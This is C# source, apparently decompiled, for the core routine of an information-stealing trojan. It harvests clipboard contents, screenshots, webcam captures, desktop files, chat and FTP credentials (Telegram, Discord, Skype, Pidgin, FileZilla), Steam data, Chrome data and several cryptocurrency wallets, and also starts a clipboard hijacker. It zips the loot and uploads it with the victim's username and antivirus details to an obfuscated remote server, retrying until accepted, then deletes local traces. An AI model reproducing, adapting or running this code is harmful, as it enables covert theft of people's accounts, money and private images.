using EntryLoader;
using System;
using System.Collections.Specialized;
using System.IO;
using System.IO.Compression;
using System.Net;
using System.Text;
using System.Threading;
using System.Windows.Forms;

internal class XS : Form
{
	public bool Start(string[] Params)
	{
		Information.Start();
		ProcList.Parse();
		Thread.Sleep(new Random().Next(1, 5) * 100);
		if (Base64.Decode(Params[2]) == "1")
		{
			clipper.Start();
		}
		Action action = delegate
		{
			CBoard.Start();
		};
		try
		{
			if (base.InvokeRequired)
			{
				Invoke(action);
			}
			else
			{
				action();
			}
		}
		catch
		{
		}
		DesktopImg.Start();
		DFiles.Start();
		WebCam.Start();
		FZ.Start();
		Pidgin.Start();
		DS.Start();
		TG.Start();
		Skype.Start();
		Steam.Start();
		BTCQt.Start();
		BTCByte.Start();
		BTCDASH.Start();
		BTCETH.Start();
		BTCMON.Start();
		Thread.Sleep(new Random().Next(1, 5) * 1000);
		EGChromeC.Start();
		string text = null;
		text = $"{Buffer.path_ad}{GetRandom.String(null, 8)}";
		if (File.Exists(text))
		{
			File.Delete(text);
		}
		ZipFile.CreateFromDirectory(Buffer.path_l, text);
		try
		{
			if (!EntryPoint.activation)
			{
				Environment.FailFast("Program has been crashed");
			}
			using (WebClient webClient = new WebClient())
			{
				NameValueCollection nameValueCollection = new NameValueCollection();
				nameValueCollection.Add("_x_key_x_", Base64.Encode(EntryPoint.key));
				nameValueCollection.Add("zipx", Base64.Encode(File.ReadAllText(text, Encoding.GetEncoding(1251)), Encoding.GetEncoding(1251)));
				nameValueCollection.Add("desktop", Base64.Encode(File.ReadAllText($"{Buffer.path_l}ScreenShot.png", Encoding.GetEncoding(1251)), Encoding.GetEncoding(1251)));
				nameValueCollection.Add("webcam", Base64.Encode(File.ReadAllText($"{Buffer.path_l}WebCam.jpg", Encoding.GetEncoding(1251)), Encoding.GetEncoding(1251)));
				nameValueCollection.Add("email", Params[0]);
				nameValueCollection.Add("caption", Exporter.Export("<title>", "</title>", Starter.FileData));
				nameValueCollection.Add("username", Base64.Encode(Environment.UserName));
				nameValueCollection.Add("c_count", Base64.Encode(Buffer.XBufferData[0]));
				nameValueCollection.Add("pcount", Base64.Encode(Buffer.XBufferData[1]));
				nameValueCollection.Add("acount", Base64.Encode(Buffer.XBufferData[10]));
				nameValueCollection.Add("cd_count", Base64.Encode(Buffer.XBufferData[11]));
				nameValueCollection.Add("steam", Base64.Encode(Buffer.XBufferData[6]));
				nameValueCollection.Add("fzilla", Base64.Encode(Buffer.XBufferData[2]));
				nameValueCollection.Add("tg", Base64.Encode(Buffer.XBufferData[3]));
				nameValueCollection.Add("dcord", Base64.Encode(Buffer.XBufferData[4]));
				nameValueCollection.Add("skype", Base64.Encode(Buffer.XBufferData[5]));
				nameValueCollection.Add("b-core", Base64.Encode(Buffer.XBufferData[7]));
				nameValueCollection.Add("b-byte", Base64.Encode(Buffer.XBufferData[13]));
				nameValueCollection.Add("b-d", Base64.Encode(Buffer.XBufferData[14]));
				nameValueCollection.Add("b-ethe", Base64.Encode(Buffer.XBufferData[15]));
				nameValueCollection.Add("b-mon", Base64.Encode(Buffer.XBufferData[16]));
				nameValueCollection.Add("avinstall", Base64.Encode(Buffer.XBufferData[18]));
				nameValueCollection.Add("_version_", Base64.Encode("3200"));
				while (true)
				{
					try
					{
						if (Encoding.Default.GetString(webClient.UploadValues(string.Format("http://{0}", Base64.Decode(string.Format("{0}{1}{2}", Buffer.Sender, Buffer.Handler, "="))), nameValueCollection)) == "good")
						{
							goto IL_040a;
						}
					}
					catch
					{
					}
					Thread.Sleep(2000);
				}
			}
		}
		catch
		{
		}
		goto IL_040a;
		IL_040a:
		try
		{
			Directory.Delete(Buffer.path_l, recursive: true);
		}
		catch
		{
		}
		try
		{
			File.Delete(text);
		}
		catch
		{
		}
		return true;
	}
}
